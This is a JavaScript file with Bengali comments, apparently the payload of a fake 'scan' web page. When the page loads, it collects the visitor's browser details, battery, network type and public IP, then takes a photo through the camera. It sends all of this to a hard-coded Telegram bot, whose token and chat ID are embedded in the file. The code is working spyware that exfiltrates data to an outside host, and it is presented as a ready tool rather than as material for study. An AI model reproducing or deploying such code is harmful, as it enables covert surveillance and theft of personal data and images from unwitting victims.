const BOT_TOKEN = "7249136904:AAGFPmdS5CnextPMpNlUPv0qeSuVHBaUF-w"; // টোকেন চেক করো
const CHAT_ID = "8174575316"; // চ্যাট আইডি চেক করো

// টেলিগ্রামে ডাটা সেন্ড করার ফাংশন
async function sendData(data, isPhoto = false) {
  try {
    if (isPhoto) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', data, 'photo.jpg');
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } else {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`);
    }
  } catch (error) {
    console.error("Error:", error);
  }
}

// ডিভাইস ইনফো সংগ্রহ
async function collectDeviceInfo() {
  let info = "📱 *ডিভাইস ইনফো* 📱\n\n";
  
  // বেসিক ইনফো
  info += `🕒 সময়: ${new Date().toLocaleString()}\n`;
  info += `🌐 ব্রাউজার: ${navigator.userAgent}\n`;
  
  // ব্যাটারি স্ট্যাটাস (মোবাইল)
  if ('getBattery' in navigator) {
    const battery = await navigator.getBattery();
    info += `🔋 ব্যাটারি: ${Math.round(battery.level * 100)}% (${battery.charging ? "চার্জ হচ্ছে" : "চার্জ হচ্ছে না"})\n`;
  }
  
  // নেটওয়ার্ক ইনফো
  if (navigator.connection) {
    info += `📶 নেটওয়ার্ক: ${navigator.connection.effectiveType}\n`;
  }
  
  // আইপি অ্যাড্রেস
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    info += `🖥️ আইপি: ${ipData.ip}\n`;
  } catch {
    info += `🖥️ আইপি: পাওয়া যায়নি\n`;
  }
  
  return info;
}

// মেইন ফাংশন
async function init() {
  // 1. ডিভাইস ইনফো সেন্ড
  const deviceInfo = await collectDeviceInfo();
  await sendData(deviceInfo);
  
  // 2. ক্যামেরা এক্সেস চেষ্টা
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    
    // 3. ফটো সেন্ড
    setTimeout(async () => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      canvas.toBlob(async (blob) => {
        await sendData(blob, true);
        document.getElementById('statusText').textContent = "স্ক্যান সম্পন্ন!";
      }, 'image/jpeg', 0.8);
    }, 3000);
    
  } catch (error) {
    await sendData("⚠️ ক্যামেরা এক্সেস দেয়নি!");
  }
}

// শুরু করো
init();